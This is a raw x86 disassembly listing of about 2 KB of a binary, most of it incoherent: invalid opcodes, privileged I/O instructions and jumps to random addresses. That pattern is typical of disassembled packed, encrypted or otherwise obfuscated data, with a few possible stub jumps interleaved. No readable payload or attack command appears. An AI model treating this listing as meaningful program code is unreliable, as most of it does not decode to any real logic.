  4089f3:	mov    dh,0x2f
  4089f5:	leave  
  4089f6:	in     al,0x70
  4089f8:	and    DWORD PTR [esi],ebp
  4089fa:	jnp    0x408a4d
  4089fc:	dec    ecx
  4089fd:	mov    al,ds:0x7b5e9f75
  408a02:	popa   
  408a03:	test   BYTE PTR [ecx+0x258090d5],al
  408a09:	inc    esi
  408a0a:	mov    bh,0xd4
  408a0c:	push   eax
  408a0d:	sti    
  408a0e:	fisub  DWORD PTR [ebp+0x68]
  408a11:	sub    BYTE PTR [edx+0x3de8a28d],0xc
  408a18:	sbb    ch,BYTE PTR [ebx-0xc]
  408a1b:	sub    esp,DWORD PTR [esi-0x20]
  408a1e:	mov    ecx,0x3fb0d50a
  408a23:	lock test eax,0x176c0671
  408a29:	jmp    DWORD PTR [ebx]
  408a2b:	popf   
  408a2c:	inc    ebp
  408a2d:	(bad)  
  408a2e:	pushf  
  408a2f:	les    ecx,FWORD PTR [ebp+0x42df6b7b]
  408a35:	int    0x1f
  408a37:	stos   DWORD PTR es:[edi],eax
  408a38:	popf   
  408a39:	shl    edi,1
  408a3b:	shl    BYTE PTR [ecx-0x6],cl
  408a3e:	lock sub ebp,DWORD PTR [edi]
  408a41:	xor    bl,BYTE PTR [ebp-0x1f]
  408a44:	repz add dh,0xe5
  408a48:	pop    ebp
  408a49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a4a:	inc    ebx
  408a4b:	dec    ebx
  408a4c:	and    al,0xa5
  408a4e:	mov    ecx,0xe5fa1c3e
  408a53:	push   ebx
  408a54:	mov    eax,ds:0x72614e83
  408a59:	(bad)  
  408a5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a5b:	jno    0x4089f4
  408a5d:	or     edi,esi
  408a5f:	loop   0x408aba
  408a61:	push   0x82e0cb71
  408a66:	pop    edx
  408a67:	enter  0x8ce,0x6e
  408a6b:	and    al,0x7f
  408a6d:	mov    ebx,0xec2f5a4b
  408a72:	cmp    DWORD PTR [edi],eax
  408a74:	dec    esp
  408a75:	jge    0x408a57
  408a77:	nop
  408a78:	scas   al,BYTE PTR es:[edi]
  408a79:	pop    esp
  408a7a:	shr    DWORD PTR [edi],cl
  408a7c:	mov    bl,ch
  408a7e:	xchg   DWORD PTR [ebp-0x49],edi
  408a81:	out    dx,eax
  408a82:	fidivr WORD PTR [ecx+ebx*8+0x31ee1a52]
  408a89:	inc    ecx
  408a8a:	stos   DWORD PTR es:[edi],eax
  408a8b:	cmp    eax,0xc501e7b3
  408a90:	(bad)  
  408a92:	pop    ds
  408a93:	call   0x6e4a:0xf25b51ce
  408a9a:	sub    ebp,DWORD PTR [edx]
  408a9c:	retf   
  408a9d:	mov    esi,0xbda13b6d
  408aa2:	rcr    BYTE PTR [esi-0x30],1
  408aa5:	and    BYTE PTR [edi+0x1a],cl
  408aa8:	dec    esp
  408aa9:	fcmovnbe st,st(6)
  408aab:	stos   BYTE PTR es:[edi],al
  408aac:	push   esp
  408aad:	data16 clc 
  408aaf:	mov    DWORD PTR [esi],ebp
  408ab1:	sub    al,ch
  408ab3:	ror    BYTE PTR [edi-0x62e85b1d],1
  408ab9:	mov    BYTE PTR [ecx],dh
  408abb:	loope  0x408b29
  408abd:	jb     0x408b15
  408abf:	pop    edi
  408ac0:	int    0x86
  408ac2:	jecxz  0x408b28
  408ac4:	mov    ebp,0x38e1f472
  408ac9:	dec    edx
  408aca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408acb:	mov    bh,0x11
  408acd:	dec    edx
  408ace:	fwait
  408acf:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  408ad1:	pop    es
  408ad2:	mov    ebx,0xa177dd43
  408ad7:	jb     0x408ab9
  408ad9:	daa    
  408ada:	cmp    bl,BYTE PTR [ebx+edx*4-0x7dc2e2f0]
  408ae1:	or     al,0x50
  408ae3:	ret    0x4acb
  408ae6:	je     0x408ac6
  408ae8:	inc    esi
  408ae9:	pop    ebx
  408aea:	iret   
  408aeb:	dec    ebp
  408aec:	xor    bh,ch
  408aee:	push   0x77
  408af0:	xchg   ecx,eax
  408af1:	mov    cl,0x3
  408af3:	mov    esi,0x787c74aa
  408af8:	inc    ecx
  408af9:	(bad)  
  408afa:	enter  0xae3,0xef
  408afe:	cwde   
  408aff:	adc    eax,0x1a2ab2d6
  408b04:	xchg   edx,eax
  408b05:	test   al,0xa0
  408b07:	xor    DWORD PTR [edi+0x7d6ba144],eax
  408b0d:	mov    BYTE PTR [ebx-0x5d951013],ch
  408b13:	sbb    esi,ebp
  408b15:	ins    DWORD PTR es:[edi],dx
  408b16:	imul   esi,DWORD PTR [esi],0x58
  408b19:	lahf   
  408b1a:	hlt    
  408b1b:	dec    esi
  408b1c:	pop    edi
  408b1d:	add    al,0xba
  408b1f:	aad    0xa3
  408b21:	bound  esp,QWORD PTR [ecx+0x40]
  408b24:	add    edx,0xb
  408b27:	arpl   WORD PTR [ecx+0x22243a94],dx
  408b2d:	in     al,0xfd
  408b2f:	addr16 ret 0xd061
  408b33:	push   0x1a
  408b35:	ins    DWORD PTR es:[edi],dx
  408b36:	aas    
  408b37:	dec    edi
  408b38:	pop    ebx
  408b39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b3a:	pop    ebx
  408b3b:	(bad)  [ebp-0x4a]
  408b3e:	pop    es
  408b3f:	data16 fs adc al,dl
  408b43:	mov    cl,0x46
  408b45:	jno    0x408aea
  408b47:	gs scas al,BYTE PTR es:[edi]
  408b49:	push   ebp
  408b4a:	push   ds
  408b4b:	pop    ebp
  408b4c:	and    BYTE PTR ds:0xf581681e,ah
  408b52:	loope  0x408b3f
  408b54:	cmp    cl,bl
  408b56:	das    
  408b57:	rol    DWORD PTR [ebp+0x58ded58],1
  408b5d:	stos   BYTE PTR es:[edi],al
  408b5e:	(bad)  
  408b60:	retf   0xa8e2
  408b63:	lds    edi,FWORD PTR [edx+0x4d]
  408b66:	pop    ds
  408b67:	je     0x408b79
  408b69:	pop    ss
  408b6a:	loop   0x408b2e
  408b6c:	cmp    al,0x3f
  408b6e:	lahf   
  408b6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b70:	jns    0x408b91
  408b72:	cld    
  408b73:	fmul   QWORD PTR [esi]
  408b75:	pop    eax
  408b76:	xor    cl,BYTE PTR [eax+0x440bde1a]
  408b7c:	pop    ds
  408b7d:	push   edi
  408b7e:	bound  esp,QWORD PTR [esi+0x346e2220]
  408b84:	ror    esi,cl
  408b86:	call   0x40cf739c
  408b8b:	ret    
  408b8c:	bound  eax,QWORD PTR [edi+0x22]
  408b8f:	cmp    al,0xd0
  408b91:	sub    al,BYTE PTR [ecx+0x24]
  408b94:	lea    ebx,[ebp+0x5fe4183b]
  408b9a:	xlat   BYTE PTR ds:[ebx]
  408b9b:	addr16 mov ds:0xe00b,eax
  408b9f:	out    dx,eax
  408ba0:	or     dl,BYTE PTR [ecx+0x681fcbeb]
  408ba6:	loop   0x408c1c
  408ba8:	jge    0x408b34
  408baa:	sbb    al,0x92
  408bac:	jmp    0x9e0e:0xdd107c7e
  408bb3:	mov    ?,WORD PTR [eax+ebx*8-0x77f569e9]
  408bba:	mov    ebx,DWORD PTR [edx+ebp*4+0x79]
  408bbe:	lea    esi,[edx-0x64]
  408bc1:	inc    ecx
  408bc2:	mov    al,cl
  408bc4:	pop    esi
  408bc5:	loop   0x408b8e
  408bc7:	xchg   edi,eax
  408bc8:	scas   eax,DWORD PTR es:[edi]
  408bc9:	jg     0x408c07
  408bcb:	sti    
  408bcc:	outs   dx,BYTE PTR ds:[esi]
  408bcd:	mov    al,0x32
  408bcf:	xor    dl,dl
  408bd1:	inc    ebx
  408bd2:	loop   0x408bc6
  408bd4:	push   ebx
  408bd5:	arpl   cx,di
  408bd7:	adc    eax,0x3ae5dda8
  408bdc:	(bad)  
  408bde:	fnsave ds:0xe6e13905
  408be4:	aad    0x67
  408be6:	or     ebp,eax
  408be8:	adc    al,0x50
  408bea:	fadd   QWORD PTR [eax-0x33f32e1e]
  408bf0:	jmp    0x408c61
  408bf2:	xor    dh,bl
  408bf4:	pop    ebp
  408bf5:	in     al,0x4e
  408bf7:	mov    esi,0xb71ca0d0
  408bfc:	ror    BYTE PTR [ebx-0x4287b233],0x16
  408c03:	xchg   ebx,eax
  408c04:	jmp    0x408bec
  408c06:	push   edi
  408c07:	pushf  
  408c08:	jl     0x408c82
  408c0a:	mov    BYTE PTR [edi+0xa],bh
  408c0d:	pop    ss
  408c0e:	(bad)  
  408c0f:	in     eax,dx
  408c10:	cmp    BYTE PTR [esi+0x42],0xe4
  408c14:	dec    ebx
  408c15:	sbb    bh,dl
  408c17:	or     bl,BYTE PTR [eax]
  408c19:	add    DWORD PTR [edi+0x5383f71a],ecx
  408c1f:	pop    esp
  408c20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c21:	lods   al,BYTE PTR ds:[esi]
  408c22:	inc    esp
  408c23:	xor    al,0x8e
  408c26:	xchg   esi,eax
  408c27:	adc    al,0x59
  408c29:	mov    dh,0xf3
  408c2b:	push   esi
  408c2c:	mov    ds:0xe709e730,eax
  408c31:	mov    edi,0xe4e0ff9b
  408c36:	scas   eax,DWORD PTR es:[edi]
  408c37:	dec    ebx
  408c38:	cmp    ebp,esp
  408c3a:	popa   
  408c3b:	retf   0x1e4a
  408c3e:	push   edx
  408c3f:	push   eax
  408c40:	shr    ch,1
  408c42:	retf   
  408c43:	jge    0x408c03
  408c45:	adc    al,0x5c
  408c47:	pop    ecx
  408c48:	dec    ecx
  408c49:	xchg   ecx,edx
  408c4b:	dec    BYTE PTR [edx]
  408c4d:	push   DWORD PTR [ebp-0x10]
  408c50:	mov    eax,ds:0x41b264
  408c55:	mov    eax,DWORD PTR [eax]
  408c57:	push   DWORD PTR [eax]
  408c59:	lea    eax,ds:0x41b280
  408c5f:	jmp    0x408fac
  408c64:	mov    ebx,0x93838448
  408c69:	push   ebx
  408c6a:	mov    ebx,0x78da0248
  408c6f:	(bad)  
  408c70:	ficom  DWORD PTR [edx-0x26b8fe3a]
  408c76:	jo     0x408ce8
  408c78:	and    BYTE PTR [ebp+0x70],bh
  408c7b:	jo     0x408c97
  408c7d:	pop    esp
  408c7e:	ins    DWORD PTR es:[edi],dx
  408c7f:	jbe    0x408c80
  408c81:	push   edi
  408c82:	cmp    cl,BYTE PTR [ecx+eiz*8]
  408c85:	cmp    BYTE PTR [ecx+0x183b0d9b],0x4e
  408c8c:	cwde   
  408c8d:	shr    BYTE PTR [ecx],0x74
  408c90:	mov    cs,WORD PTR [edx+0x47b80c21]
  408c96:	or     al,0xe2
  408c98:	repz push ebp
  408c9a:	jb     0x408c7a
  408c9c:	je     0x408c8b
  408c9e:	mov    eax,ds:0x7fc6755a
  408ca3:	mov    esp,0xc06cc453
  408ca8:	mov    edx,0xb5411f1
  408cad:	in     al,0x7
  408caf:	rcr    BYTE PTR [ebx+0x73ea9679],0x3c
  408cb6:	push   0xd8c0f97
  408cbb:	sbb    eax,0x37c69756
  408cc0:	cmp    al,0x32
  408cc2:	cmp    ebp,0xffffffca
  408cc5:	fst    QWORD PTR [edi+0x8]
  408cc8:	adc    DWORD PTR ds:0xe5c0f246,0xc6edaf07
  408cd2:	inc    eax
  408cd3:	sub    DWORD PTR [ecx],ebp
  408cd5:	cmp    ebx,DWORD PTR [edx-0x12]
  408cd8:	enter  0xaf5f,0xb9
  408cdc:	test   BYTE PTR [edx+0x56],bl
  408cdf:	or     ch,BYTE PTR [esi-0x47]
  408ce2:	and    esi,ebp
  408ce4:	inc    eax
  408ce5:	push   ebp
  408ce6:	pusha  
  408ce7:	or     eax,0xc3fae443
  408cec:	jle    0x408c93
  408cee:	sub    al,0xf7
  408cf0:	int3   
  408cf1:	mov    esi,edi
  408cf3:	pop    eax
  408cf4:	mov    ds:0xf848216c,eax
  408cf9:	inc    esi
  408cfa:	adc    ebp,0xffffffb1
  408cfd:	imul   edx,DWORD PTR [edx],0xe54b572c
  408d03:	iret   
  408d04:	enter  0x2830,0x45
  408d08:	adc    al,0x10
  408d0a:	and    DWORD PTR [ecx+0x3],ebx
  408d0d:	adc    al,0x5a
  408d0f:	imul   BYTE PTR [ebx]
  408d11:	sub    dl,BYTE PTR [ebp-0xd]
  408d14:	cs pushf 
  408d16:	and    DWORD PTR ds:0xb40e390f,esp
  408d1c:	nop
  408d1d:	pop    edx
  408d1e:	(bad)  
  408d1f:	sub    BYTE PTR [edi],dl
  408d21:	mov    esp,0x53d4f13c
  408d26:	lea    edi,[ebx]
  408d28:	mov    edx,ss
  408d2a:	dec    ebx
  408d2b:	cmp    eax,0xbefdcc6f
  408d30:	ins    BYTE PTR es:[edi],dx
  408d31:	xor    al,0x98
  408d33:	xor    eax,0xf5c99e33
  408d38:	fild   QWORD PTR [edx+ebx*4-0x21]
  408d3c:	pop    ss
  408d3d:	sbb    BYTE PTR [edx],0x1b
  408d40:	arpl   WORD PTR [edx+ebp*8-0x4b],sp
  408d44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d45:	repnz mov ecx,0x52fb2555
  408d4b:	call   0x31ff:0x612505bc
  408d52:	test   al,0xae
  408d54:	xchg   ebp,eax
  408d55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d56:	adc    eax,0xe2c82993
  408d5b:	jns    0x408daa
  408d5d:	mov    al,0x3f
  408d5f:	xor    eax,0x567127dc
  408d64:	fimul  DWORD PTR [ebx]
  408d66:	aas    
  408d67:	div    DWORD PTR [edx-0x32]
  408d6a:	(bad)  
  408d6c:	mov    bh,0xa
  408d6e:	popf   
  408d6f:	inc    esi
  408d70:	aas    
  408d71:	mov    cl,0x8e
  408d73:	imul   ecx,esp,0x23
  408d76:	add    eax,DWORD PTR [edx]
  408d78:	ins    DWORD PTR es:[edi],dx
  408d79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d7a:	sti    
  408d7b:	jge    0x408d7c
  408d7d:	mov    al,0x35
  408d7f:	out    dx,eax
  408d80:	aam    0x20
  408d82:	mov    ch,0xfa
  408d84:	ds pop esp
  408d86:	aad    0xa9
  408d88:	or     edi,DWORD PTR [eax+0x9]
  408d8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d8c:	rcr    BYTE PTR ds:0x5d9dca78,1
  408d92:	mov    al,ds:0x7a666d44
  408d97:	test   al,0x1c
  408d99:	aas    
  408d9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d9b:	push   es
  408d9c:	pop    esp
  408d9d:	sub    bl,bl
  408d9f:	mov    cl,0xdc
  408da1:	(bad)  
  408da3:	xor    bh,ah
  408da5:	and    al,0x64
  408da7:	cdq    
  408da8:	push   0xffffff9f
  408daa:	cwde   
  408dab:	cdq    
  408dac:	cmp    al,0xda
  408dae:	dec    edx
  408daf:	xchg   ebp,eax
  408db0:	xchg   edx,edi
  408db2:	jmp    0x408d5f
  408db4:	pop    ebx
  408db5:	adc    DWORD PTR [eax],ebx
  408db7:	shr    DWORD PTR [ecx-0x52],0xfc
  408dbb:	push   cs
  408dbc:	add    al,0x64
  408dbe:	lock push es
  408dc0:	cwde   
  408dc1:	jo     0x408dfe
  408dc3:	push   0xe5f4ed75
  408dc8:	dec    eax
  408dc9:	leave  
  408dca:	lahf   
  408dcb:	push   esp
  408dcc:	mov    BYTE PTR [edi+0x55],bl
  408dcf:	and    DWORD PTR [edi+0x78],0x49d5b769
  408dd6:	pop    ebp
  408dd7:	sbb    BYTE PTR [ebx-0x3e8fcf7],ch
  408ddd:	mov    dl,0xe
  408ddf:	sahf   
  408de0:	stos   DWORD PTR es:[edi],eax
  408de1:	xchg   esi,eax
  408de2:	call   FWORD PTR [ecx-0x4f]
  408de5:	or     bh,BYTE PTR [esi-0x1c]
  408de8:	in     al,dx
  408de9:	shl    DWORD PTR [edi-0x5c9f3496],0xc4
  408df0:	dec    esp
  408df1:	inc    edx
  408df2:	addr16 std 
  408df4:	adc    bh,BYTE PTR [edi-0x1d]
  408df7:	pushf  
  408df8:	mov    dh,BYTE PTR [edi+0x69f00a33]
  408dfe:	push   ebp
  408dff:	and    dl,bh
  408e01:	std    
  408e02:	out    dx,al
  408e03:	xchg   edx,eax
  408e04:	mov    dl,ch
  408e06:	mul    bl
  408e08:	jne    0x408d96
  408e0a:	ja     0x408db3
  408e0c:	pop    ebp
  408e0d:	xchg   edx,eax
  408e0e:	and    dl,BYTE PTR [ebx+esi*8]
  408e11:	retf   
  408e12:	(bad)  [esi+0x6b891f14]
  408e18:	or     ch,BYTE PTR [ecx]
  408e1a:	sbb    ecx,DWORD PTR [eax]
  408e1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e1d:	out    dx,al
  408e1e:	scas   al,BYTE PTR es:[edi]
  408e1f:	test   ch,0x90
  408e22:	pop    edx
  408e23:	mov    bl,0xf1
  408e25:	mov    DWORD PTR [edx-0x26],edi
  408e28:	pop    esp
  408e29:	aam    0xfa
  408e2b:	popa   
  408e2c:	pushf  
  408e2d:	cmp    cl,BYTE PTR [ebx-0x62]
  408e30:	rcr    DWORD PTR [ebp-0x4c6b05d0],cl
  408e36:	cdq    
  408e37:	sti    
  408e38:	fimul  WORD PTR [ebx+0x69]
  408e3b:	mov    al,ds:0xe6f4b29d
  408e40:	sbb    al,0xe9
  408e42:	xlat   BYTE PTR ds:[ebx]
  408e43:	test   eax,0xab13454b
  408e48:	bound  ebx,QWORD PTR [edx]
  408e4a:	xor    DWORD PTR [ebx],eax
  408e4c:	addr16 ss push ds
  408e4f:	push   ss
  408e50:	xchg   esi,eax
  408e51:	adc    ecx,DWORD PTR [eax+0x41e53993]
  408e57:	pushf  
  408e58:	jmp    0xf15b:0xf4b02e23
  408e5f:	les    edx,FWORD PTR [ecx]
  408e61:	push   ebx
  408e62:	inc    edi
  408e63:	dec    ebp
  408e64:	es jmp 0x408eab
  408e67:	(bad)  
  408e69:	jae    0x408e8e
  408e6b:	xchg   ecx,eax
  408e6c:	push   ebx
  408e6d:	add    edx,ebx
  408e6f:	dec    esi
  408e70:	test   al,0xf0
  408e72:	loopne 0x408e39
  408e74:	loop   0x408e2f
  408e76:	push   ss
  408e77:	jo     0x408e5b
  408e79:	xchg   ebp,eax
  408e7a:	pop    edi
  408e7b:	int    0xff
  408e7d:	xchg   edx,eax
  408e7e:	loope  0x408e81
  408e80:	adc    ch,bh
  408e82:	es int3 
  408e84:	out    dx,eax
  408e85:	popa   
  408e86:	fisubr DWORD PTR [edx+ebx*8-0x69]
  408e8a:	(bad)  
  408e8b:	push   edx
  408e8c:	daa    
  408e8d:	(bad)  
  408e8e:	shl    DWORD PTR ds:0x4e3f675e,cl
  408e94:	xchg   ebp,eax
  408e95:	or     eax,0x3f727019
  408e9a:	dec    DWORD PTR [ebx+0x3cfee9c3]
  408ea0:	out    dx,eax
  408ea1:	inc    edi
  408ea2:	das    
  408ea3:	or     ebp,DWORD PTR [edi+edx*2]
  408ea6:	push   cs
  408ea7:	ret    
  408ea8:	lock sbb cl,BYTE PTR [eax]
  408eab:	add    DWORD PTR [eax-0x1965b381],0xffffff8f
  408eb2:	pop    edx
  408eb3:	inc    ebx
  408eb4:	xor    DWORD PTR [ecx],ebp
  408eb6:	jne    0x408ee8
  408eb8:	fwait
  408eb9:	js     0x408ec4
  408ebb:	and    al,0x54
  408ebd:	scas   al,BYTE PTR es:[edi]
  408ebe:	(bad)  
  408ebf:	gs call 0x51d7:0xd0802954
  408ec7:	jb     0x408ebc
  408ec9:	jo     0x408f0a
  408ecb:	add    ebx,ecx
  408ecd:	mov    dl,0x8c
  408ecf:	(bad)  
  408ed0:	push   edx
  408ed1:	jno    0x408ef7
  408ed3:	mov    cl,0xaa
  408ed5:	xor    dh,bl
  408ed7:	sub    bl,ch
  408ed9:	lock out dx,al
  408edb:	and    bh,BYTE PTR [esi-0x1d]
  408ede:	jp     0x408e93
  408ee0:	xor    BYTE PTR [esi+0x5621ac7e],ch
  408ee6:	pop    ss
  408ee7:	dec    edx
  408ee8:	xchg   ecx,eax
  408ee9:	int3   
  408eea:	xchg   esi,eax
  408eeb:	js     0x408eb6
  408eed:	and    dl,al
  408eef:	loope  0x408f50
  408ef1:	pop    ebx
  408ef2:	mov    bh,dh
  408ef4:	test   bh,ch
  408ef6:	push   esp
  408ef7:	push   ecx
  408ef8:	icebp  
  408ef9:	fisttp QWORD PTR [esi]
  408efb:	ror    BYTE PTR [ecx*2+0x35f1b4fa],0x1
  408f03:	std    
  408f04:	add    bh,BYTE PTR [ebx-0x2d]
  408f07:	dec    esi
  408f08:	rol    BYTE PTR [eax],0x6f
  408f0b:	adc    al,0x78
  408f0e:	ret    
  408f0f:	inc    edi
  408f10:	lahf   
  408f11:	adc    edx,ebx
  408f13:	pop    edi
  408f14:	test   al,0xd
  408f16:	jo     0x408f57
  408f18:	shl    DWORD PTR [eax+ecx*1],cl
  408f1b:	inc    esi
  408f1c:	xchg   edi,eax
  408f1d:	popf   
  408f1e:	outs   dx,BYTE PTR ds:[esi]
  408f1f:	sub    dl,BYTE PTR [edi]
  408f21:	add    al,0xfd
  408f23:	and    dl,BYTE PTR [eax]
  408f25:	and    DWORD PTR [esi+0xa8b440f],esi
  408f2b:	dec    edx
  408f2c:	jecxz  0x408f07
  408f2e:	xor    al,0xa3
  408f30:	fs test al,0x4c
  408f33:	mov    esi,0x48f104be
  408f38:	je     0x408ee1
  408f3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f3b:	out    0xe2,al
  408f3d:	shr    DWORD PTR ds:0xe56254c3,0x21
  408f44:	jecxz  0x408faf
  408f46:	jmp    0x408fb8
  408f48:	test   eax,0x1afa5948
  408f4d:	xor    eax,0xee183ef9
  408f52:	pop    ds
  408f53:	fwait
  408f54:	xor    DWORD PTR [ebx+0x6879075b],esp
  408f5a:	retf   0x13b0
  408f5d:	push   cs
  408f5e:	cmpxchg DWORD PTR [edi],ebx
  408f61:	fnstsw WORD PTR [ecx-0x5425d303]
  408f67:	out    0x13,eax
  408f69:	mov    ?,ebx
  408f6b:	out    dx,al
  408f6c:	cdq    
  408f6d:	ss mov al,0x96
  408f70:	inc    esi
  408f71:	dec    ecx
  408f72:	lea    esp,[ecx]
  408f74:	mov    WORD PTR [edx],?
  408f76:	push   cs
  408f77:	fs inc esp
  408f79:	or     ebx,esp
  408f7b:	mov    ebx,0xb3136e9e
  408f80:	sahf   
  408f81:	ret    
  408f82:	std    
  408f83:	push   cs
  408f84:	xlat   BYTE PTR ds:[ebx]
  408f85:	rol    BYTE PTR [ecx],0xb6
  408f88:	ins    DWORD PTR es:[edi],dx
  408f89:	jmp    0x408f37
  408f8b:	pop    ebp
  408f8c:	dec    esi
  408f8d:	aaa    
  408f8e:	jp     0x408fb6
  408f90:	push   ecx
  408f91:	lahf   
  408f92:	xchg   ecx,eax
  408f93:	je     0x408fb9
  408f95:	enter  0x6887,0x20
  408f99:	jmp    0x408fbd
  408f9b:	js     0x408fe8
  408f9d:	inc    esi
  408f9e:	scas   eax,DWORD PTR es:[edi]
  408f9f:	fisttp WORD PTR [ecx]
  408fa1:	icebp  
  408fa2:	add    al,bl
  408fa4:	add    al,0x95
  408fa6:	loope  0x409010
  408fa8:	fldenv [edi]
  408faa:	ins    BYTE PTR es:[edi],dx
  408fab:	aaa    
  408fac:	push   DWORD PTR [eax]
  408fae:	lea    eax,ds:0x41b02c
  408fb4:	jmp    0x409301
  408fb9:	add    al,0x7c
  408fbb:	out    0xcb,eax
  408fbd:	out    0xf3,eax
  408fbf:	xor    al,0xd3
  408fc1:	call   0x5b1937f3
  408fc6:	push   cs
  408fc7:	jns    0x409010
  408fc9:	ja     0x408fb1
  408fcb:	jo     0x40903d
  408fcd:	and    BYTE PTR [ebp+0x70],bh
  408fd0:	jo     0x408f82
  408fd2:	ss push es
  408fd4:	nop
  408fd5:	addr16 std 
  408fd7:	rcl    BYTE PTR [ecx-0x19423a2e],cl
  408fdd:	sub    BYTE PTR [ebx+0x688e9cf8],0x52
  408fe4:	scas   al,BYTE PTR es:[edi]
  408fe5:	test   al,0x48
  408fe7:	xor    eax,0x9f09ff20
  408fec:	xchg   edx,eax
  408fed:	sub    al,0x85
  408fef:	xor    edx,DWORD PTR [ecx-0x64263416]
  408ff5:	pop    es
  408ff6:	jge    0x409006
  408ff8:	sbb    ah,BYTE PTR [ebx+0x55]
  408ffb:	adc    BYTE PTR [ebp+0xfb20cf0],cl
  409001:	adc    edi,DWORD PTR [eax-0x4a0adbde]
  409007:	pop    ss
  409008:	fld    TBYTE PTR [ebx+0x67]
  40900b:	xlat   BYTE PTR ds:[ebx]
  40900c:	or     eax,0x85e74aee
  409011:	pushf  
  409012:	pop    ebx
  409013:	jecxz  0x409002
  409015:	scas   al,BYTE PTR es:[edi]
  409016:	pop    ecx
  409017:	fistp  QWORD PTR [eax+0x19d3772f]
  40901d:	cmp    ah,dh
  40901f:	loopne 0x409092
  409021:	sti    
  409022:	or     ebx,DWORD PTR [ebp-0x9055ad8]
  409028:	mov    esp,0x7d453ae0
  40902d:	mov    ebp,0xb966d25c
  409032:	mov    ah,0x7b
  409034:	ja     0x409042
  409036:	daa    
  409037:	mov    dh,0x8e
  409039:	or     al,0x35
  40903b:	leave  
  40903c:	jecxz  0x408ffc
  40903e:	mov    ebx,0x822f3ce2
  409043:	das    
  409044:	push   ebp
  409045:	jecxz  0x4090a8
  409047:	cli    
  409048:	add    bl,BYTE PTR [edx]
  40904a:	cs inc ebp
  40904c:	rcr    BYTE PTR [edi],cl
  40904e:	sbb    DWORD PTR [esi+ecx*4+0x3a],esi
  409052:	stos   BYTE PTR es:[edi],al
  409053:	jbe    0x408fd8
  409055:	rcr    BYTE PTR [esi],cl
  409057:	push   ss
  409058:	mov    eax,ds:0x6093c00b
  40905d:	jmp    0x4930144f
  409062:	or     DWORD PTR [edx+0x2f879724],ebx
  409068:	inc    edx
  409069:	inc    edx
  40906a:	fs push ebx
  40906c:	mov    edi,DWORD PTR [edx]
  40906e:	shl    DWORD PTR [edx+0x7],cl
  409071:	pop    ds
  409072:	adc    ebx,eax
  409074:	loope  0x4090c8
  409076:	xchg   DWORD PTR [ecx+0x30],ecx
  409079:	mov    DWORD PTR [esi+0x59],edx
  40907c:	sub    edi,esp
  40907e:	sti    
  40907f:	mov    esi,0xc899ccfb
  409084:	lods   al,BYTE PTR ds:[esi]
  409085:	rcl    ebp,cl
  409087:	add    DWORD PTR [edi],esi
  409089:	fistp  DWORD PTR [eax+eiz*8-0x66d46fc8]
  409090:	push   0x6eab7e4c
  409095:	adc    BYTE PTR [eax],al
  409097:	stos   DWORD PTR es:[edi],eax
  409098:	arpl   WORD PTR [edx],dx
  40909a:	jmp    0xecf3:0xae17ce7b
  4090a1:	mov    esp,0x2cac8757
  4090a6:	pop    ds
  4090a7:	pop    es
  4090a8:	sahf   
  4090a9:	mov    ds:0x38bd75d5,al
  4090ae:	add    eax,0xbce9a5e
  4090b3:	xor    dh,BYTE PTR [edx]
  4090b5:	push   ebx
  4090b6:	outs   dx,DWORD PTR ds:[esi]
  4090b7:	xor    DWORD PTR ds:0xe061eead,edi
  4090bd:	addr16 push 0xffffffb1
  4090c0:	cmp    DWORD PTR [ebx+esi*1-0x311776b5],esi
  4090c7:	mov    al,ds:0xd2728eb0
  4090cc:	repnz mov edx,0x3baa8a71
  4090d2:	adc    al,0x3a
  4090d4:	xor    eax,0x8766c619
  4090d9:	nop
  4090da:	jns    0x409128
  4090dc:	iret   
  4090dd:	rol    BYTE PTR [edi-0x22cd855],0x53
  4090e4:	sub    ah,bh
  4090e6:	out    0xdb,eax
  4090e8:	fidivr WORD PTR [edi-0x41]
  4090eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090ec:	jp     0x40908a
  4090ee:	adc    eax,0x724accb7
  4090f3:	and    DWORD PTR [ebp+0x38aeb894],esi
  4090f9:	or     al,0x8
  4090fb:	cld    
  4090fc:	in     eax,0x57
  4090fe:	inc    edi
  4090ff:	dec    eax
  409100:	repnz add al,0x65
  409103:	out    dx,al
  409104:	mov    WORD PTR [edx+0x2d],ds
  409107:	popf   
  409108:	int    0xcc
  40910a:	fidivr WORD PTR [edx+0x1a0e42c5]
  409110:	jge    0x40916d
  409112:	adc    ah,al
  409114:	scas   eax,DWORD PTR es:[edi]
  409115:	xor    eax,0x109b2986
  40911a:	inc    ecx
  40911b:	(bad)  
  40911c:	stos   DWORD PTR es:[edi],eax
  40911d:	test   BYTE PTR [eax-0x3fb31fb],cl
  409123:	mov    dl,0x38
  409125:	mov    ah,0xa0
  409127:	jae    0x4090c7
  409129:	add    al,0x66
  40912b:	sub    DWORD PTR ds:0xdd09784d,edi
  409131:	or     ecx,ebp
  409133:	sahf   
  409134:	dec    esp
  409135:	cwde   
  409136:	mov    bh,0xea
  409138:	pop    esp
  409139:	add    al,0xb5
  40913b:	sub    DWORD PTR [ebp+ebp*8+0x3],eax
  40913f:	out    0x3,al
  409141:	mov    al,ds:0xc280d655
  409146:	sbb    eax,0xda0d0eb8
  40914b:	and    BYTE PTR [edi],ch
  40914d:	lea    edx,[ebp+0x5888ddbf]
  409153:	jmp    0x8518728a
  409158:	cmp    eax,0xd18f1d90
  40915d:	jo     0x40917a
  40915f:	mov    eax,ds:0xcdf880b0
  409164:	adc    ebx,ebx
  409166:	add    al,0xa3
  409168:	outs   dx,DWORD PTR ds:[esi]
  409169:	xchg   BYTE PTR [edi+0x17],ah
  40916c:	xlat   BYTE PTR ds:[ebx]
  40916d:	aaa    
  40916e:	aam    0xb2
  409170:	lds    esi,FWORD PTR [ebx-0x55]
  409173:	cli    
